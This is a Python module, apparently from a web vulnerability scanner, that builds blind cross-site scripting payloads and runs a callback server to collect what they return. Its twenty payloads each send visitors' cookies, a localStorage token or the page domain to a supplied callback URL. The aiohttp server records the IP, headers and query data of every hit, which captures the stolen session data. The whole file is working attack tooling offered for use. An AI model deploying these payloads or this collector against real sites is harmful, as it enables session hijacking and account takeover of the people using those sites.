#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Blind XSS Handler
Handles blind XSS detection with callback server
"""

import asyncio
from typing import Dict, List
from datetime import datetime

class BlindXSSHandler:
    """Handle Blind XSS detection"""
    
    def __init__(self):
        self.callbacks = []
        self.collected_data = []
        
    def generate_blind_payloads(self, callback_url: str) -> List[str]:
        """Generate blind XSS payloads with callback"""
        payloads = [
            f"<script src='{callback_url}?c='+document.cookie></script>",
            f"<img src=x onerror=\"fetch('{callback_url}?c='+localStorage.getItem('token'))\">",
            f"<script>new Image().src='{callback_url}?c='+document.cookie</script>",
            f"<svg/onload=\"fetch('{callback_url}?c='+document.domain)\">",
            f"<script>fetch('{callback_url}',{{method:'POST',body:document.cookie}})</script>",
            f"<img src=x onerror=\"navigator.sendBeacon('{callback_url}',document.cookie)\">",
            f"<script>var x=new XMLHttpRequest();x.open('GET','{callback_url}?c='+document.cookie,true);x.send()</script>",
            f"<iframe src='javascript:fetch(\"{callback_url}?c=\"+document.cookie)'></iframe>",
            f"<script>window.location='{callback_url}?c='+document.cookie</script>",
            f"<object data='{callback_url}?c='+document.cookie></object>",
            f"<embed src='{callback_url}?c='+document.cookie></embed>",
            f"<link rel='stylesheet' href='{callback_url}?c='+document.cookie>",
            f"<video><source onerror=\"document.location='{callback_url}?c='+document.cookie\"></video>",
            f"<audio src=x onerror=\"document.location='{callback_url}?c='+document.cookie\">",
            f"<input type='image' src='x' onerror=\"document.location='{callback_url}?c='+document.cookie\">",
            f"<body onload=\"document.location='{callback_url}?c='+document.cookie\">",
            f"<table background='javascript:document.location=\"{callback_url}?c=\"+document.cookie'>",
            f"<style>@import url('{callback_url}?c='+document.cookie)</style>",
            f"<marquee onstart=\"document.location='{callback_url}?c='+document.cookie\">",
            f"<details ontoggle=\"document.location='{callback_url}?c='+document.cookie\" open>",
        ]
        return payloads
    
    async def start_callback_server(self, host: str = '0.0.0.0', port: int = 8080):
        """Start callback server for blind XSS"""
        from aiohttp import web
        
        async def handle_callback(request):
            params = dict(request.query)
            data = {
                'timestamp': datetime.now().isoformat(),
                'ip': request.remote,
                'headers': dict(request.headers),
                'params': params,
                'path': request.path
            }
            self.collected_data.append(data)
            print(f"[BLIND XSS] Callback received from {request.remote}")
            print(f"Data: {params}")
            return web.Response(text="OK")
        
        app = web.Application()
        app.router.add_get('/callback', handle_callback)
        app.router.add_post('/callback', handle_callback)
        
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, host, port)
        await site.start()
        
        print(f"[*] Blind XSS callback server started on {host}:{port}")
        print(f"[*] Use callback URL: http://YOUR_IP:{port}/callback")
        
        while True:
            await asyncio.sleep(1)
    
    def get_collected_data(self) -> List[Dict]:
        """Get all collected blind XSS callbacks"""
        return self.collected_data
